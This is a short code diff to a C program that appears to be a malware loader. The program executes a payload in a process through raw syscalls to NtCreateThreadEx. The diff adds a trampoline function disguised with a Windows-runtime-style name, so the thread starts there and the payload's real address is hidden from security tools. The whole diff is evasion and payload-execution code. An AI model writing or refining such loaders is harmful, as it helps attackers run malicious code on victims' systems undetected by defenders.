@@ -50,6 +50,11 @@ int _TIGER(HANDLE hMutant, PVOID Handler);
 // Global Variable
 NTAPI_FUNC _G_NTFUNC = { 0 };
 
+LPVOID RtlCallFunction(LPVOID lpparam) {
+	(*(LPVOID(*)())(lpparam))();
+	return 0;
+}
+
 //int APIENTRY WinMain(HINSTANCE hInst, HINSTANCE hInstPrev, PSTR cmdline, int cmdshow){
 int main(void) {
 
@@ -275,7 +280,7 @@ int _TIGER(HANDLE hMutant, PVOID Handler) {
 
 	// executing the payload
 	SET_SYSCALL(_G_NTFUNC.NtCreateThreadEx);
-	if ((STATUS = RunSyscall(&hThread, THREAD_ALL_ACCESS, NULL, hProcess, pAddress, NULL, FALSE, NULL, NULL, NULL, NULL)) != 0x00) {
+	if ((STATUS = RunSyscall(&hThread, THREAD_ALL_ACCESS, NULL, hProcess, RtlCallFunction, pAddress, FALSE, NULL, NULL, NULL, NULL)) != 0x00) {
 #ifdef DEBUG
 		PRINTA("[!] NtCreateThreadEx Failed With Status : 0x%0.8X\n", STATUS);
 #endif
